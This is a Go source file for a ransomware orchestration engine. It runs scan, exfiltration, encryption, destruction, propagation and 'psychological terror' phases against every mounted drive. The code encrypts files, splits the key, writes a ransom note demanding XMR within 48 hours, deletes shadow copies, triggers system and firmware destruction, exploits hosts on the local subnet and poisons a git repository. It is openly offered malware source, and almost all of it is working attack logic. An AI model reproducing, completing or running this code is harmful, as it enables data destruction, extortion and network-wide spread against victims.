package ransomware

import (
	"context"
	"fmt"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	Config       *RansomwareConfig
	Scanner      *RegexEngine
	Crypto       *HydraEngine
	Extortion    *ExtortionEngine
	Destruction  *DestructionEngine
	Propagation  *PropagationEngine
	Psychological *PsychologicalEngine
	AntiAnalysis *AntiAnalysisEngine
	Polymorph    *PolymorphEngine
	Trust        *TrustExploitEngine

	report  *RansomwareReport
	mu      sync.Mutex
	started time.Time
}

func NewEngine(cfg *RansomwareConfig) (*Engine, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	if len(cfg.EncryptExtensions) == 0 {
		return nil, fmt.Errorf("config.EncryptExtensions must not be empty (no files to encrypt)")
	}
	if cfg.ShamirParts < 2 || cfg.ShamirThreshold < 2 {
		return nil, fmt.Errorf("config.ShamirParts and ShamirThreshold must be >= 2")
	}
	if cfg.RansomAmount <= 0 {
		cfg.RansomAmount = 50000
	}
	if cfg.RansomCurrency == "" {
		cfg.RansomCurrency = "XMR"
	}
	if cfg.DeadlineHours <= 0 {
		cfg.DeadlineHours = 48
	}
	if cfg.MaxFileSize <= 0 {
		cfg.MaxFileSize = 100 * 1024 * 1024
	}
	if cfg.ScanWorkers <= 0 {
		cfg.ScanWorkers = 8
	}
	if cfg.EncryptWorkers <= 0 {
		cfg.EncryptWorkers = 4
	}
	if cfg.ExcludePaths == nil {
		cfg.ExcludePaths = []string{"/proc", "/sys", "/dev", "/run", "/boot"}
	}

	hydra, err := NewHydraEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("hydra engine: %w", err)
	}

	scanner := NewRegexEngine(cfg.ScanWorkers)

	return &Engine{
		Config:        cfg,
		Scanner:       scanner,
		Crypto:        hydra,
		Extortion:     NewExtortionEngine(cfg),
		Destruction:   NewDestructionEngine(cfg),
		Propagation:   NewPropagationEngine(cfg),
		Psychological: NewPsychologicalEngine(cfg),
		AntiAnalysis:  NewAntiAnalysisEngine(cfg),
		Polymorph:     NewPolymorphEngine(cfg),
		Trust:         NewTrustExploitEngine(cfg),
	}, nil
}

func (e *Engine) Execute(ctx context.Context, campaignID, companyName string) (*RansomwareReport, error) {
	e.mu.Lock()
	e.started = time.Now()
	e.report = &RansomwareReport{
		CampaignID: campaignID,
		StartedAt:  e.started,
	}
	e.mu.Unlock()

	var phases []PhaseReport

	phases = append(phases, e.phaseScan(ctx))
	phases = append(phases, e.phaseExfil(ctx))
	phases = append(phases, e.phaseEncrypt(ctx))
	phases = append(phases, e.phaseDestruct(ctx))
	phases = append(phases, e.phasePropagate(ctx))
	phases = append(phases, e.phasePsychological(ctx))

	e.mu.Lock()
	e.report.Phases = phases
	e.report.CompletedAt = time.Now()
	e.report.TotalElapsedMs = time.Since(e.started).Milliseconds()
	e.report.Success = true
	for _, p := range phases {
		if !p.Success {
			e.report.Success = false
			e.report.Error = p.Error
			break
		}
	}
	r := *e.report
	e.mu.Unlock()

	return &r, nil
}

func (e *Engine) phaseScan(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseScan, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	scanCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	scanRoots := getMountPoints()
	if len(scanRoots) == 0 {
		scanRoots = []string{"/"}
	}
	if runtime.GOOS == "windows" {
		scanRoots = []string{"C:\\", "D:\\"}
	}

	results := make(chan ScanResult, 100)
	sensitive := make(chan SensitiveData, 100)

	var allResults []ScanResult
	var allSensitive []SensitiveData
	var scanErr error

	go func() {
		for r := range results {
			allResults = append(allResults, r)
		}
	}()

	go func() {
		for s := range sensitive {
			allSensitive = append(allSensitive, s)
		}
	}()

	for _, root := range scanRoots {
		if scanErr = e.Scanner.ScanDirectory(scanCtx, root, e.Config.ExcludePaths, results, sensitive); scanErr != nil {
			break
		}
		select {
		case <-scanCtx.Done():
			break
		default:
		}
	}

	e.mu.Lock()
	e.report.FilesScanned = len(allResults)
	e.report.SensitiveFound = len(allSensitive)
	e.mu.Unlock()

	scanned, matched := e.Scanner.Stats()

	detail := fmt.Sprintf("scanned=%d matched=%d files=%d sensitive=%d roots=%v", scanned, matched, len(allResults), len(allSensitive), scanRoots)
	success := (scanErr == nil || scanErr == context.DeadlineExceeded || scanErr == context.Canceled) && len(allResults) > 0

	return PhaseReport{
		Phase:     PhaseScan,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   success,
		Error:     errorString(scanErr),
		Detail:    detail,
	}
}

func (e *Engine) phaseExfil(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseExfil, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	exfilCtx, cancel := context.WithTimeout(ctx, 20*time.Second)
	defer cancel()

	var sensitiveFiles []string
	roots := getMountPoints()
	if len(roots) == 0 {
		roots = []string{"/"}
	}
	if runtime.GOOS == "windows" {
		roots = []string{"C:\\"}
	}

	for _, root := range roots {
		filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
			select {
			case <-exfilCtx.Done():
				return exfilCtx.Err()
			default:
			}
			if err != nil || d.IsDir() {
				return nil
			}
			if e.Config.ShouldExfil(path) {
				sensitiveFiles = append(sensitiveFiles, path)
			}
			if len(sensitiveFiles) >= 100 {
				return fmt.Errorf("limit")
			}
			return nil
		})
		if len(sensitiveFiles) >= 100 {
			break
		}
	}

	if len(sensitiveFiles) > 0 {
		pkg, _ := e.Extortion.PackageSensitiveData(sensitiveFiles, "")
		if pkg != nil {
			e.mu.Lock()
			e.report.ExfilPackages++
			e.mu.Unlock()
		}
	}

	detail := fmt.Sprintf("files=%d packages=%d", len(sensitiveFiles), e.report.ExfilPackages)

	return PhaseReport{
		Phase:     PhaseExfil,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    detail,
	}
}

func (e *Engine) phaseEncrypt(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseEncrypt, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	encryptCtx, cancel := context.WithTimeout(ctx, 5*time.Minute)
	defer cancel()

	roots := getMountPoints()
	if len(roots) == 0 {
		roots = []string{"/"}
	}
	if runtime.GOOS == "windows" {
		roots = []string{"C:\\"}
	}

	var totalEncrypted int
	for _, root := range roots {
		select {
		case <-encryptCtx.Done():
			break
		default:
		}
		enc, err := e.Crypto.EncryptDirectory(encryptCtx, root, e.Config)
		if err != nil && err != context.DeadlineExceeded && err != context.Canceled {
			continue
		}
		totalEncrypted += enc
	}

	e.Crypto.SplitMasterKey()

	note := e.Extortion.GenerateRansomNote(companyNameForReport(roots[0]))
	for _, root := range roots {
		if deployErr := e.Extortion.DeployRansomNote(root, note); deployErr != nil {
			continue
		}
		break
	}

	e.mu.Lock()
	e.report.FilesEncrypted = e.Crypto.Stats()
	e.report.RansomNoteDeployed = true
	e.mu.Unlock()

	detail := fmt.Sprintf("encrypted=%d roots=%v", totalEncrypted, roots)

	return PhaseReport{
		Phase:     PhaseEncrypt,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    detail,
	}
}

func (e *Engine) phaseDestruct(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseDestruct, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	if !e.Config.MFTDestruct && !e.Config.FirmwareSabotage && !e.Config.CloudBackupKill {
		return PhaseReport{Phase: PhaseDestruct, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped (no destruction options enabled)"}
	}

	e.Destruction.DeleteShadowCopies()

	err := e.Destruction.DestroySystem()

	e.mu.Lock()
	e.report.DestructionApplied = err == nil
	e.mu.Unlock()

	detail := "destruction applied"
	if err != nil {
		detail = fmt.Sprintf("destruction error: %v", err)
	}

	return PhaseReport{
		Phase:     PhaseDestruct,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   err == nil,
		Error:     errorString(err),
		Detail:    detail,
	}
}

func (e *Engine) phasePropagate(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhasePropagate, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	targets := e.Propagation.DiscoverTargets(detectLocalSubnet(), nil)
	propagated := 0

	for _, t := range targets {
		if err := ctx.Err(); err != nil {
			break
		}
		if err := e.Propagation.ExecuteExploit(t); err == nil {
			propagated++
		}
	}

	e.Propagation.PoisonGitRepo("/tmp/repo", "echo pwned")

	e.mu.Lock()
	e.report.HostsPropagated = propagated
	e.mu.Unlock()

	detail := fmt.Sprintf("targets=%d exploited=%d", len(targets), propagated)

	return PhaseReport{
		Phase:     PhasePropagate,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    detail,
	}
}

func (e *Engine) phasePsychological(ctx context.Context) PhaseReport {
	start := time.Now()

	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhasePsychological, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}

	if !e.Config.PsychologicalTerror {
		return PhaseReport{Phase: PhasePsychological, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped (psychological terror disabled)"}
	}

	e.Psychological.DeployRansomwareUI("X404X Target")
	e.Psychological.DeployTerror()

	e.mu.Lock()
	e.report.PsychologicalDeployed = true
	e.mu.Unlock()

	return PhaseReport{
		Phase:     PhasePsychological,
		StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    "psychological terror deployed",
	}
}

func (e *Engine) Report() *RansomwareReport {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.report
}

func getMountPoints() []string {
	if runtime.GOOS == "windows" {
		return []string{"C:\\"}
	}
	data, err := os.ReadFile("/proc/mounts")
	if err != nil {
		return []string{"/"}
	}
	var mounts []string
	seen := map[string]bool{"/": true}
	mounts = append(mounts, "/")
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		mp := fields[1]
		dev := fields[0]
		if !strings.HasPrefix(dev, "/dev/") {
			continue
		}
		if strings.HasPrefix(mp, "/proc") || strings.HasPrefix(mp, "/sys") ||
			strings.HasPrefix(mp, "/dev") || strings.HasPrefix(mp, "/run") {
			continue
		}
		if mp != "/" && strings.HasPrefix(mp, "/") && !seen[mp] {
			seen[mp] = true
			mounts = append(mounts, mp)
		}
	}
	if len(mounts) == 1 {
		mounts = append(mounts, "/home", "/var", "/tmp")
	}
	return mounts
}

func companyNameForReport(root string) string {
	host, _ := os.Hostname()
	host = strings.ToUpper(host)
	if host == "" {
		return "Unknown Corporation"
	}
	return host + " INC."
}

func errorString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

func detectLocalSubnet() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "10.0.0.0/24"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipnet, ok := addr.(*net.IPNet)
			if !ok || ipnet.IP.To4() == nil {
				continue
			}
			mask := ipnet.Mask
			ip := ipnet.IP.To4()
			network := net.IP(make([]byte, 4))
			for i := range network {
				network[i] = ip[i] & mask[i]
			}
			ones, _ := mask.Size()
			return fmt.Sprintf("%d.%d.%d.%d/%d", network[0], network[1], network[2], network[3], ones)
		}
	}
	return "10.0.0.0/24"
}
